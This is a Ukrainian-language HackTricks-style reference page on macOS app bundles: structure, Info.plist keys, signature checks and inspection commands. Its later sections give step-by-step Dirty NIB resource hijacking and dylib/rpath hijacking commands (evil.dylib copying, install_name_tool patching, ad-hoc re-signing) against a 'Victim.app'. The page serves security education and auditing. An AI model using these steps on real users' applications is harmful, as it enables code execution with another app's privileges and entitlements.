# Bundles у macOS

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Bundles у macOS слугують контейнерами для різноманітних ресурсів, зокрема застосунків, бібліотек та інших необхідних файлів, завдяки чому у Finder вони відображаються як окремі об’єкти, наприклад знайомі файли `*.app`. Найпоширенішим bundle є bundle `.app`, хоча також часто використовуються інші типи, як-от `.framework`, `.systemextension` і `.kext`.

### Основні компоненти Bundle

Усередині bundle, зокрема в каталозі `<application>.app/Contents/`, містяться різноманітні важливі ресурси:

- **\_CodeSignature**: Цей каталог містить дані code-signing, необхідні для перевірки цілісності застосунку. Переглянути інформацію про code-signing можна за допомогою таких команд:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Містить виконуваний binary застосунку, який запускається після взаємодії з користувачем.
- **Resources**: Репозиторій компонентів користувацького інтерфейсу застосунку, зокрема зображень, документів і описів інтерфейсу (файлів nib/xib).
- **Info.plist**: Виконує роль основного конфігураційного файлу застосунку, необхідного для того, щоб система могла належним чином розпізнавати застосунок і взаємодіяти з ним.

#### Важливі ключі в Info.plist

Файл `Info.plist` є основою конфігурації застосунку та містить такі ключі:

- **CFBundleExecutable**: Визначає назву основного executable-файлу, розташованого в директорії `Contents/MacOS`.
- **CFBundleIdentifier**: Надає застосунку глобальний ідентифікатор, який macOS широко використовує для керування застосунками.
- **LSMinimumSystemVersion**: Вказує мінімальну версію macOS, необхідну для запуску застосунку.

### Дослідження Bundles

Щоб дослідити вміст bundle, наприклад `Safari.app`, можна використати таку команду: `bash ls -lR /Applications/Safari.app/Contents`

Це дослідження показує такі директорії, як `_CodeSignature`, `MacOS`, `Resources`, і такі файли, як `Info.plist`. Кожен із них має окреме призначення — від захисту застосунку до визначення його користувацького інтерфейсу й операційних параметрів.

#### Додаткові директорії Bundle

Окрім поширених директорій, bundles також можуть містити:

- **Frameworks**: Містить frameworks, які входять до складу застосунку. Frameworks подібні до dylibs, але містять додаткові ресурси.
- **PlugIns**: Директорія для plug-ins і extensions, які розширюють можливості застосунку.
- **XPCServices**: Містить XPC services, які застосунок використовує для комунікації між процесами.

Ця структура забезпечує інкапсуляцію всіх необхідних компонентів у bundle, створюючи модульне та захищене середовище застосунку.

Для отримання докладнішої інформації про ключі `Info.plist` та їхні значення документація Apple для розробників містить вичерпні ресурси: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Нотатки щодо безпеки та вектори зловживання

- **Gatekeeper / App Translocation**: Коли quarantined bundle запускається вперше, macOS виконує глибоку перевірку підпису та може запустити його з рандомізованого translocated path. Після прийняття під час наступних запусків виконуються лише поверхневі перевірки; resource files у `Resources/`, `PlugIns/`, nibs тощо історично не перевірялися. Починаючи з macOS 13 Ventura, під час першого запуску виконується глибока перевірка, а новий дозвіл TCC *App Management* обмежує сторонні процеси в модифікації інших bundles без згоди користувача, однак старі системи залишаються вразливими.
- **Колізії Bundle Identifier**: Кілька embedded targets (PlugIns, helper tools), які повторно використовують той самий `CFBundleIdentifier`, можуть порушити перевірку підпису та іноді уможливити hijacking/confusion URL-scheme. Завжди перераховуйте sub-bundles і перевіряйте унікальність ID.

## Resource Hijacking (Dirty NIB / NIB Injection)

До Ventura підміна UI resources у підписаному застосунку могла обійти поверхневу перевірку code signing і забезпечити code execution із entitlements застосунку. Поточні дослідження (2024) показують, що це й надалі працює на системах до Ventura та в un-quarantined builds:<sup>[1][2]</sup>

1. Скопіюйте target app у доступне для запису місце (наприклад, `/tmp/Victim.app`).
2. Замініть `Contents/Resources/MainMenu.nib` (або будь-який nib, оголошений у `NSMainNibFile`) на malicious one, який створює екземпляри `NSAppleScript`, `NSTask` тощо.
3. Запустіть застосунок. Malicious nib виконується з bundle ID та entitlements victim app (TCC grants, microphone/camera тощо).
4. Ventura+ протидіє цьому, виконуючи deep verification bundle під час першого запуску та вимагаючи дозвіл *App Management* для подальших модифікацій, тому persistence стає складнішою, але атаки під час першого запуску на старих версіях macOS усе ще можливі.<sup>[1]</sup>

Мінімальний приклад malicious nib payload (скомпілюйте xib у nib за допомогою `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking усередині Bundles

Оскільки пошук `@rpath` надає перевагу bundled Frameworks/PlugIns, розміщення malicious library всередині `Contents/Frameworks/` або `Contents/PlugIns/` може перенаправити порядок завантаження, якщо main binary підписаний без library validation або зі слабким порядком `LC_RPATH`.

Типові кроки під час експлуатації unsigned/ad-hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Примітки:
- Hardened runtime без `com.apple.security.cs.disable-library-validation` блокує сторонні dylibs; спочатку перевірте entitlements.
- XPC services у `Contents/XPCServices/` часто завантажують sibling frameworks — аналогічно патчте їхні binaries для persistence або privilege escalation paths.

## Коротка пам’ятка з інспекції
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Посилання

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
